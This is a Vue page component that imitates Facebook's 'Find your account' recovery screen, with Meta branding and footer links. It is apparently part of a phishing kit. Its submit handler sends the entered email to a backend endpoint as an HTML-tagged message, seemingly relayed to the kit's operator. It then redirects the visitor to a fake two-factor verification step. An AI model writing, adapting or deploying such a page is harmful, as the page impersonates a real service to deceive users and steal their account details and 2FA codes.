<script setup lang="ts">
import FindEmailMobile from '~/layouts/FindEmailMobile.vue'
const email = ref('')
const router = useRouter()
async function submitForm() {
  if (!email.value) return

  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ message: `📭 Email: <code>${email.value}</code>` }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    router.push('/two_step_verification/two_factor')
  } catch (error) {
    console.error(error)
  }

  // Call your API here
}
</script>
<template>
  <div class="h-lvh">
    <FindEmailMobile class="hidden max-md:flex" />
    <div class="max-md:hidden flex flex-col h-lvh">
      <header class="max-md:h-[50px] h-[56px] flex items-end justify-center">
        <div
          class="w-full max-w-[981px] max-md:flex max-md:justify-center max-md:items-center max-md:h-full"
        >
          <p class="text-[38px] text-[#0866FF] cursor-pointer font-bold">facebook</p>
        </div>
      </header>
      <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-full">
        <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md">
          <p
            class="hidden max-md:block text-center mb-3 text-[38px] text-[#0064E0] cursor-pointer font-bold"
          >
            facebook
          </p>
          <div class="max-md:text-center text-xl text-[#182440] py-5 font-semibold border-b px-5">
            {{ $t('Find your account') }}
          </div>
          <div class="p-5 pb-1">
            <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
              {{
                $t(
                  "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
                )
              }}
              <a class="text-[#0064E0]" href="/login">
                {{ $t('cancel this process') }}
              </a>
            </div>
            <input
              v-model="email"
              type="email"
              class="border my-4 p-4 w-full border-gray-300 rounded-md"
              placeholder="Enter Email"
            />
          </div>

          <div class="max-md:flex-col p-5 border-t flex justify-end gap-2">
            <button
              class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-[#e5e7eb] font-bold text-[#55575b] hover:bg-[#d4d7de] cursor-pointer"
            >
              {{ $t('Cancel') }}
            </button>
            <button
              class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-blue-500 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
              @click="submitForm"
            >
              {{ $t('Search') }}
            </button>
          </div>
        </div>
      </div>
      <footer
        class="max-md:hidden mt-auto bg-white w-full flex flex-col items-center py-[28px] pb-[40px] px-10"
      >
        <div class="w-full max-w-[980px]">
          <!-- Language Links -->
          <div
            class="flex font-light justify-start flex-wrap space-x-[10px] text-gray-500 text-[12px]"
          >
            <a href="#" class="hover:underline">English (UK)</a>
            <a href="#" class="hover:underline">Tiếng Việt</a>
            <a href="#" class="hover:underline">中文(台灣)</a>
            <a href="#" class="hover:underline">한국어</a>
            <a href="#" class="hover:underline">日本語</a>
            <a href="#" class="hover:underline">Français (France)</a>
            <a href="#" class="hover:underline">ภาษาไทย</a>
            <a href="#" class="hover:underline">Español</a>
            <a href="#" class="hover:underline">Português (Brasil)</a>
            <a href="#" class="hover:underline">Deutsch</a>
            <a href="#" class="hover:underline">Italiano</a>
            <a class="plus-wrapper">
              <!-- <span class="px-2">+</span> -->
              <!-- <i class="plus"></i> -->
              <span class="text-[16px]"> + </span>
            </a>
          </div>

          <!-- Divider Line -->
          <div class="max-w-[980px] w-full border-t border-gray-300 my-[8px]"></div>

          <!-- Other Links -->
          <div
            class="max-w-[980px] font-light list-language flex flex-wrap justify-start text-gray-500 text-[12px]"
          >
            <a href="#" class="hover:underline">Sign Up</a>
            <a href="#" class="hover:underline">Log in</a>
            <a href="#" class="hover:underline">Messenger</a>
            <a href="#" class="hover:underline">Facebook Lite</a>
            <a href="#" class="hover:underline">Video</a>
            <a href="#" class="hover:underline">Places</a>
            <a href="#" class="hover:underline">Games</a>
            <a href="#" class="hover:underline">Marketplace</a>
            <a href="#" class="hover:underline">Meta Pay</a>
            <a href="#" class="hover:underline">Meta Store</a>
            <a href="#" class="hover:underline">Meta Quest</a>
            <a href="#" class="hover:underline">Ray-Ban Meta</a>
            <a href="#" class="hover:underline">Meta AI</a>
            <a href="#" class="hover:underline">Instagram</a>
            <a href="#" class="hover:underline">Threads</a>
            <a href="#" class="hover:underline">Fundraisers</a>
            <a href="#" class="hover:underline">Services</a>
            <a href="#" class="hover:underline">Voting Information Centre</a>
            <a href="#" class="hover:underline">Privacy Policy</a>
            <a href="#" class="hover:underline">Privacy Centre</a>
            <a href="#" class="hover:underline">Groups</a>
            <a href="#" class="hover:underline">About</a>
            <a href="#" class="hover:underline">AdChoices</a>
            <a href="#" class="hover:underline">Terms</a>
            <a href="#" class="hover:underline">Help</a>
            <a href="#" class="hover:underline">Contact uploading and non-users</a>
            <a href="#" class="hover:underline">Create ad</a>
            <a href="#" class="hover:underline">Create Page</a>
          </div>

          <!-- Copyright -->
          <div class="text-gray-500 font-light text-[12px] mt-3">Meta © 2025</div>
        </div>
      </footer>
    </div>
  </div>
</template>
<style scoped>
/* Add any additional styling if necessary */
.list-language a {
  margin-right: 20px;
  display: inline-block;
  font-size: 12px;
}
@media only screen and (max-width: 1075px) {
  .form-main {
    height: 496px;
    margin: 0 40px;
    width: auto;
  }
}

.plus {
  background-image: url(/assets/icons/plus.png);
  background-size: 171px 55px;
  background-repeat: no-repeat;
  display: inline-block;
  font-style: italic;
  height: 16px;
  width: 16px;
  width: 12px;
  height: 12px;
  font-size: 12px;
  background-position: -100px -34px;
  -ms-high-contrast-adjust: none;
}

.plus-wrapper {
  cursor: pointer;
  display: inline-block;
  border: 1px solid;
  border-radius: 2px;
  box-sizing: content-box;
  font-size: 12px;
  -webkit-font-smoothing: antialiased;
  font-weight: bold;
  justify-content: center;
  padding: 0 8px;
  position: relative;
  text-align: center;
  text-shadow: none;
  vertical-align: middle;
  background-color: #f5f6f7;
  border-color: #ccd0d5;
  display: inline-flex;
  align-items: center;
  height: 18px;
}
header {
  background-color: #ffffff;
  position: relative;
  z-index: 1;
  width: 100%;
  position: fixed;
}

.icon {
  background-image: url('/icons.png');
  background-position: -38px -34px;
  -ms-high-contrast-adjust: none;
  background-size: 171px 55px;
  background-repeat: no-repeat;
  display: inline-block;
  height: 16px;
  width: 16px;
}

@media (max-width: 767px) {
  .btn-mobile {
    box-shadow:
      inset 0 0 1px rgba(0, 0, 0, 0.7),
      inset 0 1px 0 rgba(255, 255, 255, 0.3),
      0 1px 2px -1px rgba(0, 0, 0, 0.7);
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.35);
    border-radius: 6px;
    padding: 8px 17px;
    line-height: 27px;
    font-size: 16px;
    font-weight: bold;
  }
  .btn-1 {
    background: linear-gradient(#647aab, #2c467e);
  }
  .btn-2 {
    background: linear-gradient(#fdfefe, #f0f1f2);
    color: #505c77;
    text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
  }
}
</style>
